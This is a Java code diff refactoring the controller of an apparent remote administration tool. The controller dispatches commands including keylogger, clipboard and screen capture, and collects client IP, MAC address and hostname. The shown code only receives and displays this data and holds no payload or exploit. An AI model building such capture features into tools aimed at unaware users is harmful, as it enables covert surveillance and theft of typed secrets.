@@ -27,12 +27,12 @@ public class ConsumeController {
     private static Map<String, ConsumeExecutable<JSON>> controller = new HashMap();
 
     public static void init() {
-        put(COMMAND_GET_ALL_CLIENTS, ConsumeController::getAllClients);
-        put(COMMAND_MONITORING, ConsumeController::getMonitoring);
+        put(COMMAND_SYNC, ConsumeController::synchronize);
         put(COMMAND_CLIPBOARD, ConsumeController::getClipboard);
         put(COMMAND_KEYLOGGER, ConsumeController::getKeylogger);
-        put(COMMAND_SYNC, ConsumeController::synchronize);
         put(COMMAND_CLIENT_SCREEN, ConsumeController::getScreen);
+        put(COMMAND_MONITORING, ConsumeController::getMonitoring);
+        put(COMMAND_GET_ALL_CLIENTS, ConsumeController::getAllClients);
     }
 
     private static void getScreen(JSON input, Admin admin) {
@@ -48,7 +48,7 @@ public class ConsumeController {
             ByteArrayInputStream temp = new ByteArrayInputStream(ByteBuffer.wrap(arr).array());
             BufferedImage image2 = ImageIO.read(ImageIO.createImageInputStream(temp));
             ImageIcon temp1 = new ImageIcon(image2);
-            Admin.getGui().updateClientScreen(temp1);
+            Admin.getGui().fetchClientMonitor(temp1);
         } catch (Exception e) {
             throw new RuntimeException(e);
         }
@@ -74,28 +74,31 @@ public class ConsumeController {
 
     private static void getAllClients(JSON input, Admin admin) {
         HashMap clients = admin.getClients();
-        JSONArray arr = new JSONArray(input.get("clients").toString());
+        JSONArray arr = new JSONArray(input.get("clients"));
         arr.forEach(e -> {
             JSON json = new JSON(e.toString());
-            Vector<String> si = new Vector<>();
-            si.add(json.get("UUID"));
-            si.add(json.get("os"));
-            si.add(json.get("ip"));
-            si.add(json.get("ram"));
-            si.add(json.get("cpu"));
-            si.add(json.get("disk"));
-            si.add(json.get("hostName"));
-            si.add(json.get("MAC_address"));
-            clients.putIfAbsent(si.get(0), new SystemInfoModel(si.toArray()));
+            clients.putIfAbsent(json.get("UUID"), new SystemInfoModel(
+                    json.get("ram"),
+                    json.get("cpu"),
+                    json.get("disk"),
+                    json.get("os"),
+                    json.get("ip"),
+                    json.get("MAC_address"),
+                    json.get("hostName")
+            ));
         });
     }
 
     private static void getMonitoring(JSON input, Admin admin) {
-        Admin.getGui().updateProgressBar(
-                input.getInt("cpu"),
-                input.getInt("ram"),
-                input.getInt("disk")
-        );
+        try {
+            Admin.getGui().fetchClientSystemUsage(
+                    input.getInt("cpu"),
+                    input.getInt("ram"),
+                    input.getInt("disk"));
+        } catch (Exception e) {
+            // IN SOME CASE, CLIENT CAN NOT CALCULATE PERCENT CPU USAGE
+            Admin.getGui().fetchClientSystemUsage(0, input.getInt("ram"), input.getInt("disk"));
+        }
     }
 
     public static ConsumeExecutable get(String key) {
